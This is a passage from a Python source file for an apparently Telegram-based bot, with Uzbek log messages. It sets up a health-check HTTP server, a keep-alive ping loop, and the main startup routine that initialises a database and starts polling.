async def health_check(request):
    return web.Response(text="Bot is running!")

async def start_http_server():
    try:
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', PORT)
        await site.start()
        logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
        
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        logger.error(f"❌ HTTP server xatosi: {e}")

# ================= KEEP-ALIVE =================
async def keep_alive():
    while True:
        try:
            await bot.get_me()
            logger.info("📡 Ping yuborildi")
        except Exception as e:
            logger.error(f"❌ Ping xatosi: {e}")
        await asyncio.sleep(60)

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    try:
        await init_db()
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
        return
    
    asyncio.create_task(start_http_server())
    asyncio.create_task(keep_alive())
    
    logger.info("✅ Bot tayyor!")
    
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"❌ Bot xatosi: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot to'xtatildi")
    except Exception as e:
        logger.error(f"❌ Kutilmagan xatolik: {e}")
